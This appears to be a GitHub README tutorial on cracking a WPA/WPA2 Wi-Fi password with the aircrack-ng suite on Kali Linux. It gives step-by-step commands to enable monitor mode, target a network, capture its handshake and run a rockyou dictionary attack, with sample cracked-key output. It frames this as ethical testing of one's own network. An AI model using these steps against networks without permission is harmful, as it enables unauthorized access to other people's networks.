# WiFi Password Cracking

This documentation demonstrates how to perform a WPA/WPA2 Wi-Fi handshake capture and password cracking using Aircrack-ng inside Kali Linux. This is done **ethically** for testing purposes **on your own network** only.

---

## ⚠️ Legal Disclaimer

> 🚨 This documentation is **for educational and ethical testing purposes only**.  
> You must have **explicit permission** to test any network. Unauthorized access is **illegal** and punishable by law.

---

## 📦 Requirements

- **Kali Linux** (on VirtualBox/VMware or bare-metal)
- **External USB Wi-Fi Adapter (Wi-Fi Dongle)**  
  Must support:
  - **Monitor Mode**
  - **Packet Injection**  
  ✅ Examples:
  - ALFA AWUS036ACH  
  - TP-Link TL-WN722N v1

- `aircrack-ng` suite
- `rockyou.txt` wordlist or custom dictionary

---

## 🛠 Installation

```bash
sudo apt update
sudo apt install aircrack-ng
```
📡 Wi-Fi Hacking Steps (WPA/WPA2 Cracking)
------------------------------------------

### 🔌 1. Connect External Wi-Fi Adapter

> 💡 **Note:** If you're using a VM, your internal Wi-Fi card won't support monitor mode. Use an external USB Wi-Fi adapter.

### 🔍 2. Find Wireless Interface

```bash
iwconfig
```
Check for interface like `wlan0`.

### 🛑 3. Set Interface to Monitor Mode

```bash
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```
### 📶 4. Start Airodump to Discover Networks

```bash
sudo airodump-ng wlan0
```
Note the **BSSID**, **channel**, and **ESSID** of the target network.

### 🎯 5. Capture the Handshake

Replace `<BSSID>` and `<channel>` with target info:

```bash
sudo airodump-ng --bssid <BSSID> -c <channel> -w capture wlan0
```
Wait until you see:\
`WPA Handshake: <BSSID>`

### 💥 6. Crack the Handshake

```bash
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```
> If `rockyou.txt` is missing, extract it using:

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```
### ✅ 7. If Password Found

Output will show:

```text
KEY FOUND! [ your_wifi_password ]
```
* * * * *

🧪 Sample Output
----------------

```text
KEY FOUND! [ iloveyou ]

Master Key     : 34 4D B2 ...
Transient Key  : F1 52 5B ...
EAPOL HMAC     : 4B 63 5E ...
```
* * * * *

📁 Files in this Repo
---------------------

| File Name | Description |
| --- | --- |
| `capture-01.cap` | Captured handshake file (example) |
| `README.md` | Documentation |

* * * * *

👨‍💻 Author
------------

[**Jagadish Tripathy**](https://www.linkedin.com/in/jagadishtripathy/)  
CEH v.12

* * * * *

⭐ Support
---------

If this documentation helped you, consider giving it a ⭐ on GitHub!
